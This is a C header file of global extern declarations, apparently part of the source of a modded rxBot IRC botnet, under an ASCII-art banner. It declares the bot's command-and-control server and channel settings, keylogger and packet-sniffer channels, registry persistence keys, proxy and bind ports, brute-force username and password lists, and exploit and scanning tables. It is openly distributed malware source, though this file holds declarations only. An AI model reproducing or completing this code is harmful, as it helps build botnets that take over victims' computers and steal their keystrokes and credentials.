//==========================================================================\\
//=       ===   ==   ==      =====      =========  =====  ===      ======  =\\
//=  ====  ===  ==  ===  ===  ===   ==   ========   ===   ==   ==   =====  =\\
//=  ====  ===  ==  ===  ====  ==  ====  ===  ===  =   =  ==  ====  =====  =\\
//=  ===   ====    ====  ===  ===  ====  ==    ==  == ==  ==  ====  =====  =\\
//=      =======  =====      ====  ====  ===  ===  =====  ==  ====  ===    =\\
//=  ====  ====    ====  ===  ===  ====  ===  ===  =====  ==  ====  ==  =  =\\
//=  ====  ===  ==  ===  ====  ==  ====  ===  ===  =====  ==  ====  ==  =  =\\
//=  ====  ===  ==  ===  ===  ===   ==   ===  ===  =====  ==   ==   ==  =  =\\
//=  ====  ==  ====  ==      =====      ====   ==  =====  ===      ====    =\\
//==========================================================================\\
//////RXB()tM()d/////////BuZ-MoD///////RXB()tM()d////////BuZ-MoD////////////\\
//////////////////////////////////////////////////////////////////////////////

extern char botid[];
extern char version[];
extern char password[];
extern char server[];
extern int port;
extern char serverpass[];
extern char channel[];
extern char chanpass[];
extern char server2[];
extern int port2;
extern char channel2[];
extern char chanpass2[];
extern char filename[];
extern char keylogfile[];
extern char valuename[];
extern char nickconst[]; 
extern char szLocalPayloadFile[];
extern char modeonconn[];
extern char exploitchan[];
extern char keylogchan[];
extern char psniffchan[];
extern char *authost[];
extern char *versionlist[];
extern char regkey1[];
extern char regkey2[];
extern char regkey3[];
extern char regkey4[];

extern char keylogfile[];
extern char keylogchan[];
extern int socks4port;
extern int tftpport;
extern int httpport;
extern int rloginport;
extern int bindport;

extern BOOL topiccmd;
extern BOOL rndfilename;
extern BOOL AutoStart;

extern char prefix;

extern int maxrand;
extern int nicktype;
extern BOOL nickprefix;

// global threads
extern THREAD threads[MAXTHREADS];

// url visit function
extern HANDLE ih;

// aliases
extern ALIAS aliases[MAXALIASES];
extern int anum;

// passwords
extern char *usernames[];
extern char *passwords[];

// advscan
extern EXPLOIT exploit[];

//allscan
extern SCANALL allscan[];

// misc
extern DWORD started;
#ifndef NO_VNC 
extern char http[]; 
#endif

#ifdef DEBUG_LOGGING
extern char logfile[];
#endif
